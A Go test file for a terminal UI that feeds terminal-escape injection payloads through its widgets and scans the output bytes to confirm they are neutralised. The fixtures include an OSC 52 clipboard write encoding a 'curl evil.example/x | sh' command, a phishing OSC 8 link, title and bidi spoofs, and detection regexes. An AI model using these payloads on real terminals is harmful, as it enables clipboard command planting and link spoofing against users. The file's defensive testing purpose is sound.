package tui

import (
	"bytes"
	"io"
	"regexp"
	"sort"
	"strings"
	"sync"
	"testing"

	"github.com/gdamore/tcell/v2"
	"github.com/gdamore/tcell/v2/terminfo"
	"github.com/rivo/tview"

	"github.com/smallhoursorg/motel/motelctl/internal/termtext"
	"github.com/smallhoursorg/motel/motelctl/internal/tui/demo"
	"github.com/smallhoursorg/motel/motelctl/internal/tui/model"
)

// payloads are the hostile fixture's attacks (the d11 spike's): tags
// that colour, style, make regions and make links, and the escapes
// termtext already makes visible.
var payloads = map[string]string{
	"osc52":   "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07",
	"osc8":    "\x1b]8;;https://evil.example/login\x1b\\motel login\x1b]8;;\x1b\\",
	"title":   "\x1b]0;motel: all healthy\x07",
	"csi":     "\x1b[5A\x1b[2K\x1b[10C",
	"clear":   "\x1b[2J\x1b[H",
	"bidi":    "\u202elmth.exe\u202c",
	"c1":      "\u009b31m",
	"c1raw":   "\x9b2J",
	"tags":    `[red]FAKE[-] ["region"]hidden[""] [::b]bold[::-] [green]healthy[-]`,
	"badutf8": "\xff\xfe",
	"urltag":  "[:::https://evil.example/tag]motel login[:::-]",
	"dcs":     "\x1bPtmux;\x1b\x1b]52;c;Y3VybA==\x07\x1b\\",
	"apc":     "\x1b_Gf=100,a=T;AAAA\x1b\\",
}

// signatures are bytes that, written to a terminal, mean an attack
// reached it live. tcell's own sequences match none of them.
var signatures = map[string]*regexp.Regexp{
	"osc52":         regexp.MustCompile(`\x1b\]52;`),
	"osc8 link":     regexp.MustCompile(`\x1b\]8;[^\x07\x1b]*evil\.example`),
	"dcs":           regexp.MustCompile(`\x1bPtmux;`),
	"apc":           regexp.MustCompile(`\x1b_G`),
	"title":         regexp.MustCompile(`\x1b\]0;motel`),
	"cursor up 5":   regexp.MustCompile(`\x1b\[5A`),
	"erase line":    regexp.MustCompile(`\x1b\[2K`),
	"bidi":          regexp.MustCompile("\u202e"),
	"c1":            regexp.MustCompile("\u009b"),
	"invalid utf-8": regexp.MustCompile(`\xff\xfe`),
}

func scan(out []byte) []string {
	var found []string
	for name, re := range signatures {
		if re.Match(out) {
			found = append(found, name)
		}
	}
	sort.Strings(found)
	return found
}

// fakeTTY is a terminal for tcell's real terminfo screen: it records
// every byte tcell writes.
type fakeTTY struct {
	in     *io.PipeReader
	typing *io.PipeWriter
	mu     sync.Mutex
	out    bytes.Buffer
}

func newTTY() *fakeTTY {
	r, w := io.Pipe()
	return &fakeTTY{in: r, typing: w}
}

func (f *fakeTTY) Start() error               { return nil }
func (f *fakeTTY) Stop() error                { return nil }
func (f *fakeTTY) Drain() error               { _ = f.typing.Close(); return nil }
func (f *fakeTTY) NotifyResize(func())        {}
func (f *fakeTTY) Read(p []byte) (int, error) { return f.in.Read(p) }
func (f *fakeTTY) Close() error               { _ = f.typing.Close(); return nil }
func (f *fakeTTY) WindowSize() (tcell.WindowSize, error) {
	return tcell.WindowSize{Width: 100, Height: 30}, nil
}
func (f *fakeTTY) Write(p []byte) (int, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.out.Write(p)
}
func (f *fakeTTY) bytes() []byte {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]byte(nil), f.out.Bytes()...)
}

// ttyScreen is not initialised here: tview's SetScreen does that, and a
// second Init leaves tcell's buffer at the terminfo's width.
func ttyScreen(t *testing.T, tty *fakeTTY) tcell.Screen {
	t.Helper()
	ti, err := terminfo.LookupTerminfo("xterm-256color")
	if err != nil {
		t.Fatal(err)
	}
	scr, err := tcell.NewTerminfoScreenFromTtyTerminfo(tty, ti)
	if err != nil {
		t.Fatal(err)
	}
	return scr
}

// drawOnce draws p once on a real terminfo screen over a fake tty, and
// returns the bytes tcell wrote.
func drawOnce(t *testing.T, p tview.Primitive, focus tview.Primitive) []byte {
	t.Helper()
	tty := newTTY()
	app := tview.NewApplication().SetScreen(ttyScreen(t, tty)).SetRoot(p, true)
	if focus != nil {
		app.SetFocus(focus)
	}
	done := make(chan struct{})
	go func() { defer close(done); _ = app.Run() }()
	app.QueueUpdateDraw(func() {})
	app.QueueUpdate(func() {})
	app.Stop()
	<-done
	return tty.bytes()
}

func names() []string {
	var n []string
	for k := range payloads {
		n = append(n, k)
	}
	sort.Strings(n)
	return n
}

// widgets puts text in every kind of widget the TUI hands text to, the
// way it hands it: through boxtext.go.
func widgets(ts []termtext.Text) map[string]func() (tview.Primitive, tview.Primitive) {
	return map[string]func() (tview.Primitive, tview.Primitive){
		"table cell": func() (tview.Primitive, tview.Primitive) {
			tb := tview.NewTable()
			for i, x := range ts {
				tb.SetCell(i, 0, cell(x))
			}
			return tb, nil
		},
		"text view, lines": func() (tview.Primitive, tview.Primitive) {
			tv := textView()
			var ls []model.Line
			for _, x := range ts {
				ls = append(ls, model.Line{{T: x, C: model.Bad}, {T: x}})
			}
			setText(tv, lines(ls, true))
			return tv, nil
		},
		"text view, box lines": func() (tview.Primitive, tview.Primitive) {
			tv := textView()
			setText(tv, texts(ts))
			return tv, nil
		},
		"framed title": func() (tview.Primitive, tview.Primitive) {
			tv := textView()
			tv.SetBorder(true)
			tv.SetTitle(" " + inert(ts[0]) + " ")
			return tv, nil
		},
		"input field": func() (tview.Primitive, tview.Primitive) {
			f := tview.NewInputField()
			setLabel(f, ts[0].String())
			setInput(f, ts[len(ts)-1].String())
			return f, f
		},
	}
}

// TestEscapeHolds puts every hostile string, through termtext and the
// one door, in every widget kind used, on a real terminfo screen: no
// attack reaches the bytes. It also holds the gap the door exists for:
// tview.Escape lets a URL tag through as a live OSC 8 link.
func TestEscapeHolds(t *testing.T) {
	var ts []termtext.Text
	for _, n := range names() {
		ts = append(ts, termtext.From(n+" <"+payloads[n]+">"))
	}
	for name, mk := range widgets(ts) {
		p, f := mk()
		if found := scan(drawOnce(t, p, f)); len(found) > 0 {
			t.Errorf("%s: attacks reached the terminal: %v", name, found)
		}
	}
	for _, n := range names() {
		one := []termtext.Text{termtext.From(payloads[n])}
		for name, mk := range widgets(one) {
			p, f := mk()
			if found := scan(drawOnce(t, p, f)); len(found) > 0 {
				t.Errorf("%s alone in a %s: %v", n, name, found)
			}
		}
	}
	// The gap: the same URL tag after termtext and tview.Escape is a link.
	tag := termtext.From(payloads["urltag"]).String()
	if found := scan(drawOnce(t, tview.NewTable().SetCell(0, 0, tview.NewTableCell(tview.Escape(tag))), nil)); !strings.Contains(strings.Join(found, ","), "osc8") {
		t.Errorf("tview.Escape no longer lets a URL tag through (%v): the door's reason has changed; re-read tview's tag parser", found)
	}
	// And its inverse: inert text shows the tag as text.
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetText(inert(termtext.From("[red]x[-]")))
	if got := tv.GetText(true); !strings.Contains(got, "red") {
		t.Errorf("inert text lost its tag's words: %q", got)
	}
}

// TestSafeBytes draws the hostile app's screens, and its record and
// JSON, on a real terminfo screen: none of the fixture's attacks is in
// what tcell writes, and the escaped forms are on screen.
func TestSafeBytes(t *testing.T) {
	for _, keys := range [][]any{
		{"/", "hos", tcell.KeyEnter, tcell.KeyEnter},
		{"/", "hos", tcell.KeyEnter, tcell.KeyEnter, tcell.KeyEnter},
	} {
		tty := newTTY()
		h := startOn(t, ttyScreen(t, tty), nil)
		h.press(keys...)
		h.sync()
		out := tty.bytes()
		if found := scan(out); len(found) > 0 {
			t.Errorf("%v: attacks reached the terminal: %v", keys, found)
		}
		if !bytes.Contains(out, []byte(`evil.example`)) {
			t.Errorf("%v: the inert attacks are not on screen", keys)
		}
	}
}

var _ = demo.Host
